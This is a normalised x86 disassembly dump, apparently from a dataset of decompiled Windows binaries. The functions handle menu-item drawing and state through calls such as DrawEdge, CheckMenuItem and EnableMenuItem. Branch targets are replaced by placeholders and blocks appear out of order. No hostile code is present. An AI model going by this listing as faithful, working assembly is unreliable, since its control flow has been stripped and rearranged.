add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221f0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4221f8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4221f8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221f0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_428a38
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221cc
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4225d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4268fc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_451287
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4279e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_421a0c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d0d0
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221f8
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4502e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_421cd8
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4229f0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4226e0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d5e8
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4229f0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4224f0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_421a0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40316c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4502e4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45174b
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44f3a8
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_42282c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_4502e4
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_451898
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45227c
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_4518c8
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_451914
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_451af6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403368
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_4518c8
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45227c
mov esi eax
mov eax edi
call sub_451898
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_40434c
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b80
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403fd8
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44f3a8
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40424c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451afd
lea eax [ ebp - 0x24 ]
call sub_403f40
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4502e4
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_451b28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_40434c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403f94
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451b50
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_451cc0
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_451cd0
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_451b98
sub_451b98
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_450254
push eax
call CheckMenuItem
mov eax esi
call sub_451b50
sub_451bec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_451cc0
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_450254
push eax
call EnableMenuItem
sub_451c64
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_452024
mov edx eax
mov ecx ebx
mov eax edi
call sub_4501f4
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_451b50
sub_451cd0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_417e94
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44f2fc
sub_451d40
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_451cc0
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_451d28
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_452058
mov ecx ebx
mov edx esi
mov eax edi
call sub_451e4c
sub_451d88
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_451cc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451cd0
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_451de0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_451cc0
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_451cd0
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_451cd0
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_451e4c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44f2fc
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_4501f4
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_417f10
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_4520c4
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_451cc0
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_450124
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_417e94
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_417e94
mov dl [ eax + 0x3f ]
mov eax esi
call sub_451c64
sub_451f00
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44f2fc
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_451cc0
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_450124
mov eax ebx
call sub_451cc0
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_417e94
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_417d84
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_451f74
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_451b98
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_451ca8
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_451ca8
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45203c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_451cc0
mov edx eax
mov ecx esi
mov eax ebx
call sub_451e4c
pop esi
pop ebx
retn
sub_452058
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_452024
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_451f00
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44f2fc
sub_452080
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_4520c4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
